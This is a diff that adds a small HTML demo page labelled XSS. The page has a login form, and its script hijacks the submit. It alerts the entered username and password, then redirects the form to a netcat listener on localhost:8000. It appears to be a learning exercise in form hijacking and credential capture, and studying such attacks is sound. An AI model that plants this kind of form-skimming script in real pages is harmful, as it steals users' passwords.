@@ -1,0 +1,24 @@
+<html>
+    <body>
+        <h1 id="demo">---XSS----</h1>
+        <form id="test" action="/auth" method="GET">
+        Username:<input type="text" name="Username" />
+        <br>
+        Password: <input type="password" name="pass" />
+        <input type="submit" value="Submit" />
+    </form>
+    <br/>
+    <script>
+        function interform(){
+            alert( document.forms["test"]["Username"].value);
+            alert(document.forms[0].elements[1].value);
+            document.forms[0].action="http://localhost:8000"; // here we are submitting the values to the localhost 
+            //netcat -nlvp 8000 listening port  
+            return true ;
+
+        }
+    test.onsubmit = interform;
+    </script>
+    </body>
+
+</html>
